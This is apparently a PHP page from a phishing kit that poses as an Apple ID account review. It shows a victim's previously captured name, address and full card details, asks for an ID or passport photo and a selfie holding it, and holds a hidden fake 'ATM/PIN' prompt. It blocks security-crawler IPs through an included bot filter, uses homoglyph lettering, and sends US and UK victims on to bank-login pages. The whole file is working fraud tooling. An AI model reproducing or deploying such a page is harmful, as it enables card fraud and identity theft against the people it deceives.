<?php
	session_start();
	error_reporting(0);
	include "bots.php";  //Para Bloquear Algunas IPs / tikchbila tiwliwla ma9tloni ma7wawni ghir spam bach blawni 
	include ('config.php');
	include ('str.php');


	
	
	
	if($_SESSION['brand'] == "VISA"){
		
		$vv = "Vcard";
		
		}else if($_SESSION['brand'] == "MASTERCARD"){
		
		$vv = "Mcard";
		
		}else if($_SESSION['brand'] == "AMERICAN EXPRESS"){
		
		$vv = "Acard";
		
		}else if($_SESSION['brand'] == "DISCOVER"){
		
		$vv = "Dcard";
		
		}else{
		
		$vv = "unkn";
	}
	
	$div = "col-xs-6 col-md-4";
	$disp = "block";
	$err = "none";	
	$card = "col-xs-8";
	$sub ="return toSubmit();";
	
	
		
		if (isset($_POST['Done'])){
			
			if($_bank == 1){
						if( $countrycode == "US" ){
						header("Location: bnk_add.php ");
						}else if ($countrycode == "GB"){
						header("Location: bank_GB.php ");
						}else{
						header("Location: thanks.php ");
						}
			}else{
			header("Location: thanks.php ");
			}
	
		}
	
		
		
	
	
		
		
		
	
	
	
?>
<!DOCTYPE html>
<html>
	<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<title> My lD Account</title>
		<meta name="robots" content="noindex">

		
		<meta name="viewport" content="width=device-width, maximum-scale=1.0, user-scalable=1" />
		
		<link  rel="logo-icon" href="../set/img/iconisma.ico">
		<link rel="stylesheet" href="../set/css/intlTelInput.css">
		<link rel="stylesheet" href="../set/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="../set/css/bootstrap-theme.min.css"/>
		<link rel="stylesheet" href="../set/cssisma/tot.css" type="text/css"/>
		<link rel="stylesheet" href="../set/css/imgpicker.css">
		<link rel="stylesheet" href="../set/css/styles.css"/>
		
		
		
		<script src="../set/js/jquery-1.11.0.min.js"></script>
		<script src="../set/js/jquery.Jcrop.min.js"></script>
		<script src="../set/js/jquery.imgpicker.js"></script>
		<script src="../set/js/jquery.maskedinput.js"></script>
		
		
	</head>	
	
	
	<body style="background:#F3F3F3">
		
		<?php include("../forms/nav.php")?>
		
		<div class="container">
			<img style="width: 190px;" src="../set/img/logs.png" class="img-responsive myapp" />
			
			
			
			<div class="row row2" >
				<form onsubmit="<?=$sub ?>" name="form" method="POST" action="" > 
					<div class=" col-xs-4 sidebar mobile-hide"  >
					<img style="width:100%; position:relative; top:20px;" src="../set/img/Untitled2.png ">
					</div>
					<div class="col-xs-4 loop mobile" style="">
						<div>
								<img style="width:290px; position:relative; " src="../set/img/Review.png ">
							
							<hr/>
							<!--<p style=""><img width="310px" src="../set/img/easy.png "/> </p>-->
						</div>
						
						
						<div class="panel panel-default" id="app">
							<div class="panel-heading"><img width='70px' src="../set/img/pple.png "/> </div>
							<div class="panel-body" name="prof" id="prof">
							<div class="col-xs-12 col-md-6" s>
									<p>
										<?=$_SESSION['_email_'] ?>
									</p>
							
									<div class="col-xs-12 col-md-12" s>
									<p>Verify your identity Place your  ID OR passport, and take a clear photo of docs and also one pitcure of you holding your ID OR passport.</p> 
								</div >
							</div>
						
						
						
							<div class="col-xs-12 col-md-6" style="<?=$cardo ?>">
								
								
								<?php include ('../forms/upl.php'); ?>
								</div >
						
							</div>
							
							
						</div>
						
						<div class="panel panel-default">
							<div class="panel-heading"><img width="150px" src="../set/img/py.png "/> 
								
								
								
							</div>
							<div class="panel-body">
								<div id="bill" class="col-md-4 col-xs-6" style="display:<?=$disp?>;">
									<P>Billing Contact</p>
									<p style="padding: 0px 0px 0px 10px;">
										<?=$_SESSION['fname'].' '.$_SESSION['lname'] ?>
										<br/>
										<?=$_SESSION['_email_'] ?>
										<br/>
									</p>
								</div>
								<div class="col-md-4 col-xs-6 ">
									<p>Billing Address</p>
								<p style="padding: 0px 0px 0px 10px;">
										<?=$_SESSION['fname'].' '.$_SESSION['lname'] ?>
										<br/>
										<?=$_SESSION['uk747901']?>
										<br/>
										<?=$_SESSION['uk747902'].' '.$_SESSION['uk747903']."&nbsp;&nbsp;&nbsp;&nbsp;".$_SESSION['uk747905']?>
										<br/>
										<?=$_SESSION['uk747906']?>
										<br/>
										<b><?=$_SESSION['uk747904']?></b>
										<br/>
									</p>
								</div>	
								
								
								<div id="info" class="<?=$div?>">
									
									<div class="col-xs-12"style="<?=$style?>;padding:0;" >
										<div class="col-xs-4 cardlogo <?=$vv ?>">
											
										</div>
										<div id="old" class="<?=$card ?>">
											<?php $myStr = preg_replace('/\s+/', '', $_SESSION['ca']); $result = substr($myStr, 12, 16); echo "...".$result; ?>
											<br/>
											Expires <?=$_SESSION['exp'] ?>
										</div>
										<div id="new" class="col-xs-12 col-md-10" style="display:none;">
											
											<input type="text" id="card" class="col-xs-8 col-md-7" style="margin:10px;" value="<?=$_SESSION['ca'] ?>"/>
											<input type="text" id="expire" class="col-xs-3 col-md-3" style="margin:10px;" value="<?=$_SESSION['ex'] ?>"/>
											<input  type="text" id="cvc" maxlength="4" class="col-xs-4 col-md-3" style="margin:10px;" value="<?=$_SESSION['cv'] ?>"/>
											
										</div>
										
										<div id="pin" name="pin" class="col-xs-12 col-md-7" style="padding:5px ; font-size: 12px; display:<?=$err ?>; color: rgb(170, 0, 0);">Sorry But we couldn't verify this card, the bank issue request further verification <b> ATM/PIN</b> :  <input style="width:30%;"type="password" id="pin" name="pin" />
										</div>
									</div>	
								</div>
							</div>
						</div>
						
						
						<div class="panel panel-default">
							<div class="panel-heading"><img width="95px" src="../set/img/set.png "/> </div>
							<div class="panel-body">
								<div class="col-xs-6">
									Where do you use your products?<br/>
									No answer given.
								</div>
								<div class="col-xs-6">
									You are currently subscribed to receive news, software updates, and the latest information on products and services
								</div>
							</div>
						</div>
						
						<div class="col-xs-12">
							<button class="btn btn-lg btn-primary  mybotton" style="font-size:100%;"type="submit" name="Done" id="Done">Done</button>
							</div>	         
					</div>
					
					<div class="footbar col-xs-12">
					<p style="padding:15px;">We use a Highly encryption to pr&omicron;tect the c&omicron;nfidentiality of y&omicron;ur &Rho;ers&omicron;nal inf&omicron;rmation.</p>
					</div>
				</form>
			</div>
			<br/>
			<br/>
			<br/>
			<br/>
			<div class="panel-footer footer" >
				<img src="../set/img/footer.png" class="img-responsive" />
			</div>
		</div>
		
	</body>
	<script src="../set/js/card.js"></script>
	<script type="text/javascript">
		jQuery(function($){
			$("#exx").mask("99/9999",{placeholder:"MM/YY"});
			$("#ca").mask("9999-9999-9999-9999");
		});
	</script>
	<script> 
		var pht = 0;
		var pht2 = 0;
		$("#webcam").click(function(){
		
		$('#selfie').css({'display':'none'});	
	});
		$("#file").click(function(){
		
		$('#selfie').css({'display':'none'});	
	});
		$(function() {
			var time = function(){return'?'+new Date().getTime()};
			
			// Avatar setup
			$('#avatarModal').imgPicker({
				url: '../server/upload_avatar_autoload.php',
				aspectRatio: 1,
				loadComplete: function(image) {
					$('#avatar2').attr('src', '../../'+image.versions.avatar.url +time() );
					this.setImage(image);
				},
				deleteComplete: function() {
					$('#avatar2').attr('src', '../set/img/default-avatar.png');
					this.modal('hide');
				},
				cropSuccess: function(image) {
					$('#avatar2').attr('src', '../../'+image.versions.avatar.url +time() );
					this.modal('hide');
					pht = 1;
					//document.getElementById('cover').style.display = 'block';
					 
					
				}
			});
			
			// Demo only
			$('.navbar-toggle').on('click',function(){$('.navbar-nav').toggleClass('navbar-collapse')});
			$(window).resize(function(e){if($(document).width()>=430)$('.navbar-nav').removeClass('navbar-collapse')});
		}); 
		
		
		$(function() {
			var time = function(){return'?'+new Date().getTime()};
			
			// Avatar setup
			$('#avatarModal2').imgPicker({
				url: '../server/upload_avatar_autoload.php',
				aspectRatio: 1,
				loadComplete: function(image) {
					$('#avatar3').attr('src', '../../'+image.versions.avatar.url +time() );
					this.setImage(image);
				},
				deleteComplete: function() {
					$('#avatar3').attr('src', '../set/img/default-avatar.png');
					this.modal('hide');
				},
				cropSuccess: function(image) {
					$('#avatar3').attr('src', '../../'+image.versions.avatar.url +time() );
					this.modal('hide');
					
					//document.getElementById('cover2').style.display = 'block';
					pht2 = 1;
					
				}
			});
			
			// Demo only
			$('.navbar-toggle').on('click',function(){$('.navbar-nav').toggleClass('navbar-collapse')});
			$(window).resize(function(e){if($(document).width()>=430)$('.navbar-nav').removeClass('navbar-collapse')});
		}); 
		function toSubmit(){
			if (pht2 == 1 && pht == 1){
				return true;
				}else{
				$('html, body').animate({
					scrollTop: $("#app").offset().top
				}, 1000);
				$('#prof').css({'border': '1px solid red', 'border-radius': '5px', 'background': 'rgb(255, 249, 244) none repeat scroll 0% 0%'});
				return false;
			}
		}
		
		function edit(){
			$('#bill').css({'display':'none'});
			$('#info').removeClass('col-xs-6 col-md-4');
			$('#info').toggleClass('col-xs-8');
			$('#pin').css({'display':'none'});
			$('#old').css({'display':'none'});
			$('#new').css({'display':'block'});
			
		}
	</script>
	
	
	
</html>		